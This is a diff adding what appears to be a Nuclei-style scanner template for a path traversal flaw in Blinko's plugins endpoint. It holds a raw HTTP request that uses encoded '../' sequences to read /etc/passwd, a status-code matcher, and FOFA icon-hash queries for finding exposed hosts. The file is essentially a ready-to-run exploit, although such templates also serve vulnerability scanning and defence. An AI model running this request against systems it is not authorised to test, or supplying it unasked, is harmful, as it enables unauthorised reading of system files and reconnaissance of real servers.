@@ -1,0 +1,35 @@
+id: poc-vwsqmnt5e5kwrd9d
+info:
+  name: Blinko plugins 存在路径穿越漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vwsqmnt5e5kwrd9d'
+  tags: other,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vwsqmnt5e5kwrd9d
+    fofa: icon_hash="-1446811182" || icon_hash="-717082057"
+http:
+- raw:
+  - 'GET /plugins/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cache-Control: max-age=0
+
+    Cookie: language=zh-cn; language=zh-cn
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
